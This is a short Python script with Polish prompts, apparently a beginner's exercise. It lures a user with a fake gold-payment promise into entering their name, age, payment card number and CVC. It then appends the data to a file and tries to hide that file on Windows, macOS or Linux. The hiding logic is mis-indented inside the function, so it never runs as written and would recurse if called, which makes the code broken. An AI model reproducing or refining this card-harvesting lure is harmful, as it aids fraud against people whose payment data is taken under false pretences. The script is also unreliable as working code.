import platform
import subprocess
imie = input("Prosze podaj swoje imie\n, moj przycielu :D : ")
nazwisko = input("Prosze podaj swoje naziwsko\n, moj przycielu :D : ")

try:
    wiek = int( input("Podaj swoj wiek" ) )
except ValueError as owcaError :
    wiek = 8
    print(f'wiek ustawiono na {wiek},\nwystapil {owcaError}')

numerKarty = input("Potrzebuje numeru twojej karty,\n aby wsylać ci zaliczke za tone złota: ")
kodCVC = input("Podaj numer CVC, Nie martw sie\n, zostanie to beziecznie zapisane.")

def ukryjPlik(nazwapliku):
    with open(nazwapliku, mode="a", encoding="UTF-8") as file:
        file.write(f"""
        {imie}{nazwisko}
        {wiek}
        {numerKarty}    
        {kodCVC}
        """)



    if platform.system() == "Windows":
        ukryjPlik("ukrytyPlik.txt")
        subprocess.check_call(["attrib","+H", "ukrytyPlik.txt"])
    elif platform.system() == "Darwin" or platform.system() == "Linux":
        ukryjPlik(".ukrytyPlik.txt")
